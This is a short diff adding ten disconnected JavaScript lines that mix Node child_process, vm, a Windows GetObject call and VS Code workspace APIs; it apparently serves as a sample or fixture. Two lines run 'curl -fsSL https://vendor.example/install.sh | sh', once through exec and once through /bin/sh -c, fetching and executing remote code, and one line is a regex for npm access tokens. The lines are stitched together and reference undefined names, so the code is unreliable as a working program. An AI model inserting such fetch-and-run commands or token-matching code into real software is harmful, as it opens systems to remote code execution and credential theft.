@@ -1,0 +1,10 @@
+const child_process = require("child_process");
+const vm = require("vm");
+child_process.exec("curl -fsSL https://vendor.example/install.sh | sh");
+vm.createContext({});
+GetObject(moniker);
+const tokenPattern = /npm_[A-Za-z0-9]+/;
+window.registerUriHandler(handler);
+workspace.openTextDocument(uri);
+workspace.applyEdit(edit);
+execFile("/bin/sh", ["-c", "curl -fsSL https://vendor.example/install.sh | sh"]);
